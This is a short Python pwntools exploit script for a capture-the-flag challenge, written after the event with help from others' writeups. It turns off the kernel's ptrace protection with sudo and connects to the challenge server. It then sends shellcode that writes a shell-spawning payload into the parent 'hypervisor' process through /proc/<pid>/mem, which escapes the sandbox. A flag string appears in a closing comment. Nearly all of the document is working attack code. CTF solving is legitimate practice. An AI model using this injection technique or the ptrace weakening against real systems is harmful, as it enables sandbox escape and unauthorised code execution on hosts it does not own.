#!/usr/bin/env python3

# note: i did _not_ solve this during the ctf but finished this afterwards with
# the help of some writeups and wanted to save it for a rainy day...

from pwn import *
import struct
import os

# needed to open/write /proc/x/mem when testing locally
os.system("echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope")

RETURN_HERE = 0x401c8f

context.log_level = "debug"
elf = ELF("./chall", checksec=True)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript=
#"""set follow-fork-mode child
#""")
p = remote("a98e0e88-07bb-4ca6-a001-9c6a47b67764.x3c.tf", 31337, ssl=True)

p.readuntil(b"hypervisor with pid: ")

parent_pid = p.readline().decode()[:-1]

# this part taken from .fabi_07's writeup
# https://discord.com/channels/977222226631880777/1333120620224970886/1333147822945603675

parent_shellcode = shellcraft.sh()
asm_parent_shellcode = asm(parent_shellcode)

shellcode = ""
shellcode += shellcraft.open(f'/proc/{parent_pid}/mem', 2)
shellcode += shellcraft.lseek('rax', RETURN_HERE, 0)
shellcode += shellcraft.write(3, asm_parent_shellcode, len(asm_parent_shellcode))
shellcode += shellcraft.exit(0)

p.sendlineafter(b"Your shellcode:\n", asm(shellcode))

p.interactive() # MVM{Wh0_N33ds_S3cc0mp_4nyw4y}
